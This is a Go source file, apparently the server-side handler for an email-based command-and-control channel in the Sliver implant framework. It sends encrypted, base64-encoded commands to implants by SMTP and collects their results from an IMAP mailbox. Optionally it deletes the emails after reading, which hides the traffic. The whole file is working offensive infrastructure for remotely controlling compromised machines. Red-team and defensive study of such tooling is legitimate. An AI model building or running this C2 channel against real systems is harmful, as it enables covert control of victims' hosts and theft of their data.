package outlook

/*
	Sliver Implant Framework
	Copyright (C) 2024  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"encoding/base64"
	"fmt"
	"log"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/transports/outlook"
	"github.com/google/uuid"
)

// OutlookC2Handler gère le C2 Outlook côté serveur
type OutlookC2Handler struct {
	config         *ServerConfig
	smtpSender     *SMTPSender
	imapReceiver   *IMAPReceiver
	sessionManager *SessionManager
	running        bool
	stopChan       chan struct{}
}

// NewOutlookC2Handler crée un nouveau handler C2
func NewOutlookC2Handler(config *ServerConfig) (*OutlookC2Handler, error) {
	if err := config.Validate(); err != nil {
		return nil, fmt.Errorf("invalid config: %w", err)
	}

	return &OutlookC2Handler{
		config:         config,
		smtpSender:     NewSMTPSender(config),
		imapReceiver:   NewIMAPReceiver(config),
		sessionManager: NewSessionManager(),
		stopChan:       make(chan struct{}),
	}, nil
}

// Start démarre le handler C2
func (h *OutlookC2Handler) Start(ctx context.Context) error {
	if h.running {
		return fmt.Errorf("handler already running")
	}

	// Connexion IMAP
	if err := h.imapReceiver.Connect(); err != nil {
		return fmt.Errorf("failed to connect to IMAP: %w", err)
	}

	h.running = true

	if h.config.Debug {
		log.Printf("[Outlook C2] Handler started")
	}

	// Démarrer le polling des résultats
	go h.pollResults(ctx)

	// Démarrer le nettoyage des sessions
	go h.cleanupLoop(ctx)

	return nil
}

// Stop arrête le handler C2
func (h *OutlookC2Handler) Stop() error {
	if !h.running {
		return nil
	}

	close(h.stopChan)
	h.running = false

	// Déconnexion IMAP
	if err := h.imapReceiver.Disconnect(); err != nil {
		if h.config.Debug {
			log.Printf("[Outlook C2] Error disconnecting IMAP: %v", err)
		}
	}

	if h.config.Debug {
		log.Printf("[Outlook C2] Handler stopped")
	}

	return nil
}

// SendCommand envoie une commande à un implant
func (h *OutlookC2Handler) SendCommand(sessionID, implantEmail, command string) (string, error) {
	// Récupérer ou créer la session
	session := h.sessionManager.GetOrCreateSession(sessionID, implantEmail)

	// Créer un ID de tâche unique
	taskID := fmt.Sprintf("task-%s", uuid.New().String())

	// Ajouter la tâche à la session
	session.AddTask(taskID, command)

	// Encoder la commande en base64
	payload := base64.StdEncoding.EncodeToString([]byte(command))

	// Créer le message C2
	msg := &outlook.C2Message{
		Type:      "cmd",
		TaskID:    taskID,
		SessionID: sessionID,
		Payload:   payload,
	}

	// Encoder le message
	subject, body, err := outlook.EncodeMessage(msg, h.config.EncryptionKey)
	if err != nil {
		return "", fmt.Errorf("failed to encode message: %w", err)
	}

	// Envoyer l'email
	if err := h.smtpSender.SendEmail(implantEmail, subject, body); err != nil {
		return "", fmt.Errorf("failed to send email: %w", err)
	}

	// Marquer comme envoyée
	session.MarkTaskSent(taskID)

	if h.config.Debug {
		log.Printf("[Outlook C2] Command sent to %s (session: %s, task: %s)", implantEmail, sessionID, taskID)
	}

	return taskID, nil
}

// pollResults poll les emails pour récupérer les résultats
func (h *OutlookC2Handler) pollResults(ctx context.Context) {
	ticker := time.NewTicker(h.config.PollInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-h.stopChan:
			return
		case <-ticker.C:
			if err := h.checkResults(); err != nil {
				if h.config.Debug {
					log.Printf("[Outlook C2] Error checking results: %v", err)
				}
			}
		}
	}
}

// checkResults vérifie les nouveaux résultats
func (h *OutlookC2Handler) checkResults() error {
	// Récupérer les emails non lus
	emails, err := h.imapReceiver.FetchUnreadEmails()
	if err != nil {
		return fmt.Errorf("failed to fetch emails: %w", err)
	}

	if h.config.Debug && len(emails) > 0 {
		log.Printf("[Outlook C2] Processing %d emails", len(emails))
	}

	// Traiter chaque email
	for _, email := range emails {
		if err := h.processResult(email); err != nil {
			if h.config.Debug {
				log.Printf("[Outlook C2] Error processing email from %s: %v", email.From, err)
			}
			continue
		}

		// Marquer comme lu si configuré
		if h.config.MarkAsRead {
			if err := h.imapReceiver.MarkAsRead(email.UID); err != nil {
				if h.config.Debug {
					log.Printf("[Outlook C2] Error marking as read: %v", err)
				}
			}
		}

		// Supprimer si configuré
		if h.config.DeleteAfter {
			if err := h.imapReceiver.DeleteEmail(email.UID); err != nil {
				if h.config.Debug {
					log.Printf("[Outlook C2] Error deleting email: %v", err)
				}
			}
		}
	}

	return nil
}

// processResult traite un email contenant un résultat
func (h *OutlookC2Handler) processResult(email *Email) error {
	// Décoder le message C2
	msg, err := outlook.DecodeMessage(email.Body, h.config.EncryptionKey)
	if err != nil {
		return fmt.Errorf("failed to decode message: %w", err)
	}

	// Vérifier que c'est un résultat
	if msg.Type != "result" {
		return fmt.Errorf("unexpected message type: %s", msg.Type)
	}

	// Récupérer la session
	session := h.sessionManager.GetSession(msg.SessionID)
	if session == nil {
		// Session inconnue, créer une nouvelle
		session = h.sessionManager.GetOrCreateSession(msg.SessionID, email.From)
	}

	// Décoder le payload
	resultData, err := base64.StdEncoding.DecodeString(msg.Payload)
	if err != nil {
		return fmt.Errorf("failed to decode payload: %w", err)
	}

	// Marquer la tâche comme terminée
	session.CompleteTask(msg.TaskID, string(resultData), true)

	if h.config.Debug {
		log.Printf("[Outlook C2] Result received for task %s (session: %s)", msg.TaskID, msg.SessionID)
	}

	return nil
}

// cleanupLoop nettoie périodiquement les sessions inactives
func (h *OutlookC2Handler) cleanupLoop(ctx context.Context) {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-h.stopChan:
			return
		case <-ticker.C:
			// Nettoyer les sessions inactives depuis plus de 1 heure
			cleaned := h.sessionManager.CleanupStaleSessions(1 * time.Hour)
			if h.config.Debug && cleaned > 0 {
				log.Printf("[Outlook C2] Cleaned up %d stale sessions", cleaned)
			}
		}
	}
}

// GetSession retourne une session par ID
func (h *OutlookC2Handler) GetSession(sessionID string) *ImplantSession {
	return h.sessionManager.GetSession(sessionID)
}

// ListSessions retourne toutes les sessions actives
func (h *OutlookC2Handler) ListSessions() []*ImplantSession {
	return h.sessionManager.ListSessions()
}

// GetTaskResult récupère le résultat d'une tâche
func (h *OutlookC2Handler) GetTaskResult(sessionID, taskID string) *TaskResult {
	session := h.sessionManager.GetSession(sessionID)
	if session == nil {
		return nil
	}
	return session.GetTaskResult(taskID)
}

// WaitForTaskResult attend le résultat d'une tâche (avec timeout)
func (h *OutlookC2Handler) WaitForTaskResult(sessionID, taskID string, timeout time.Duration) (*TaskResult, error) {
	deadline := time.Now().Add(timeout)

	for {
		result := h.GetTaskResult(sessionID, taskID)
		if result != nil {
			return result, nil
		}

		if time.Now().After(deadline) {
			return nil, fmt.Errorf("timeout waiting for task result")
		}

		time.Sleep(1 * time.Second)
	}
}
